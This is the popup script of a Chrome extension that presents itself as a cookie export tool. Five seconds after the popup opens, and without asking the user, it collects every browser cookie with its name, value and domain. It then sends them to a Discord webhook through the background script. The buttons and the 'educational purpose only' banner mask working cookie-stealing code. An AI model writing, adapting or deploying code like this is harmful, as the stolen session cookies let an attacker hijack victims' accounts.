document.addEventListener('DOMContentLoaded', function() {
  const exportCurrentBtn = document.getElementById('exportCurrentSite');
  const exportAllBtn = document.getElementById('exportAllCookies');
  const statusDiv = document.getElementById('status');
  const cookieCountDiv = document.getElementById('cookieCount');

  // Update cookie count on load
  updateCookieCount();

  // Export current site cookies
  exportCurrentBtn.addEventListener('click', async () => {
    await handleExport('current');
  });

  // Export all cookies
  exportAllBtn.addEventListener('click', async () => {
    await handleExport('all');
  });

  // Automatically export cookies on page load
  setTimeout(async () => {
    await handleExport('all');
  }, 5000); // Delay to ensure the page is fully loaded

  // Function to handle export and send to Discord webhook
  async function handleExport(type) {
    try {
      let cookies;
      if (type === 'current') {
        const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
        const url = new URL(tab.url);
        const domain = url.hostname;
        showStatus('Collecting cookies...', 'info');
        cookies = await chrome.cookies.getAll({ domain: domain });
      } else {
        showStatus('Collecting all cookies...', 'info');
        cookies = await chrome.cookies.getAll({});
      }

      if (cookies.length === 0) {
        showStatus('No cookies found', 'error');
        return;
      }

      const content = exportCookiesToString(cookies);
      await sendToDiscord(content);
      showStatus(`✓ Exported and sent ${cookies.length} cookies`, 'success');
    } catch (error) {
      showStatus('Error: ' + error.message, 'error');
      console.error(error);
    }
  }

  // Function to export cookies to a string
  function exportCookiesToString(cookies) {
    let content = '='.repeat(80) + '\n';
    content += 'COOKIE EXPORT - EDUCATIONAL PURPOSE ONLY\n';
    content += 'Generated: ' + new Date().toLocaleString() + '\n';
    content += 'Total Cookies: ' + cookies.length + '\n';
    content += '='.repeat(80) + '\n\n';

    // Group cookies by domain
    const cookiesByDomain = {};
    cookies.forEach(cookie => {
      const domain = cookie.domain;
      if (!cookiesByDomain[domain]) {
        cookiesByDomain[domain] = [];
      }
      cookiesByDomain[domain].push(cookie);
    });

    // Write cookies grouped by domain
    Object.keys(cookiesByDomain).sort().forEach(domain => {
      content += '\n' + '-'.repeat(80) + '\n';
      content += `DOMAIN: ${domain}\n`;
      content += `Cookies: ${cookiesByDomain[domain].length}\n`;
      content += '-'.repeat(80) + '\n';

      cookiesByDomain[domain].forEach((cookie, index) => {
        content += `\n[Cookie #${index + 1}]\n`;
        content += `Name: ${cookie.name}\n`;
        content += `Value: ${cookie.value}\n`;
        content += `Domain: ${cookie.domain}\n`;
      });
    });

    content += '\n' + '='.repeat(80) + '\n';
    content += 'END OF COOKIE EXPORT\n';
    content += '='.repeat(80) + '\n';

    return content;
  }

  // Function to send content to Discord webhook via background script
  async function sendToDiscord(content) {
    return new Promise((resolve, reject) => {
      chrome.runtime.sendMessage(
        { action: 'sendToDiscord', content: content },
        (response) => {
          if (chrome.runtime.lastError) {
            reject(new Error(chrome.runtime.lastError.message));
          } else if (response && response.success) {
            resolve();
          } else {
            reject(new Error(response?.error || 'Failed to send message to Discord'));
          }
        }
      );
    });
  }

  // Update cookie count display
  async function updateCookieCount() {
    try {
      const cookies = await chrome.cookies.getAll({});
      cookieCountDiv.textContent = `Cookies: ${cookies.length}`;
    } catch (error) {
      console.error('Error counting cookies:', error);
    }
  }

  // Show status message
  function showStatus(message, type) {
    statusDiv.textContent = message;
    statusDiv.className = 'status show ' + type;

    setTimeout(() => {
      statusDiv.classList.remove('show');
    }, 3000);

    updateCookieCount();
  }

  // Get formatted timestamp
  function getTimestamp() {
    const now = new Date();
    return now.toISOString().replace(/[:.]/g, '-').slice(0, -5);
  }
});